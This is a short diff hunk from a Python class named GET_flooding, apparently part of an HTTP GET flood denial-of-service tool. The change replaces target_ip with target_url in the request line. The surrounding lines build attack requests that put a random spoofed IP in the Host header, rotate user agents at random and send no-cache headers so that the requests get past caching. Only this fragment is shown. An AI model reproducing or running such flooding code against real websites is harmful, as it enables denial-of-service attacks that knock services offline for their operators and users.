@@ -42,7 +42,7 @@ class GET_flooding(Thread):
     ##make Victim information(get method)
     def make_attack_information(self):
         random_attacker_ip = RandIP()
-        req_header='GET {} HTTP/1.1\r\n'.format(target_ip)
+        req_header='GET {} HTTP/1.1\r\n'.format(target_url)
         req_header+='Host : {}\r\n'.format(random_attacker_ip) # random_ip
         req_header+='User-Agent: {}\r\n'.format(random.choice (useragents))
         req_header+='Cache-Control : no-cache\r\n' 
